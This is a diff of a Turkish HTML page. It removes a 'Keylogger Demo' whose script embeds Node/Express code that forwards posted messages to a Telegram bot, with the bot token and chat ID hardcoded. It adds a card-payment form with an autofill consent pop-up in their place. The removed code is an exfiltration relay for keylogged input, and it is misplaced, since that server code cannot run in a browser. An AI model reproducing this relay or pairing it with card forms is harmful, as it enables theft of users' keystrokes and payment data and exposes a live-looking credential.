@@ -1,41 +1,96 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Keylogger Demo</title>
+  <meta charset="UTF-8">
+  <title>Ödeme Sayfası</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      background-color: #f2f2f2;
+    }
+    form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 25px;
+      padding: 12px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      width: 100%;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+    }
+    #popup div {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    #popup.show {
+      visibility: visible;
+    }
+  </style>
 </head>
 <body>
-  <h2>Keylogger Demo</h2>
-  <textarea id="input" rows="10" cols="60" placeholder="Yazmaya başla..."></textarea>
 
-  <script>
-   const express = require('express');
-const axios = require('axios');
-const app = express();
+<div id="popup">
+  <div>
+    <p>Tarayıcıda kayıtlı kart bilgileriniz otomatik doldurulabilir. İzin veriyor musunuz?</p>
+    <button onclick="onConsent(true)">İzin Veriyorum</button>
+    <button onclick="onConsent(false)" style="margin-top: 10px;">İzin Vermiyorum</button>
+  </div>
+</div>
 
-app.use(express.json());
+<form id="paymentForm" autocomplete="on">
+  <h2>Kart ile Ödeme</h2>
+  <input type="text" name="cc-number" inputmode="numeric" placeholder="Kart Numarası" autocomplete="cc-number" required>
+  <input type="text" name="cc-exp" placeholder="Son Kullanma Tarihi (AA/YY)" autocomplete="cc-exp" required>
+  <input type="text" name="cc-csc" placeholder="CVV" autocomplete="cc-csc" required>
+  <button type="submit">Ödemeyi Tamamla</button>
+</form>
 
-const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
-const TELEGRAM_CHAT_ID = '5395609882';
+<script>
+  // Pop-up'ı göster
+  document.getElementById("popup").classList.add("show");
 
-app.post('/send', async (req, res) => {
-  const { message } = req.body;
-  if (!message) return res.status(400).json({ error: 'Mesaj gerekli' });
+  function onConsent(consentGiven) {
+    document.getElementById("popup").classList.remove("show");
 
-  try {
-    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-    });
-    res.json(response.data);
-  } catch (error) {
-    res.status(500).json({ error: error.message });
+    if (!consentGiven) {
+      // Otomatik doldurmayı kapat
+      const form = document.getElementById("paymentForm");
+      form.setAttribute("autocomplete", "off");
+    }
+    // Aksi durumda tarayıcının kendi otomatik doldurması aktif kalır
   }
-});
+</script>
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server ${PORT} portunda çalışıyor`));
-
-  </script>
 </body>
 </html>
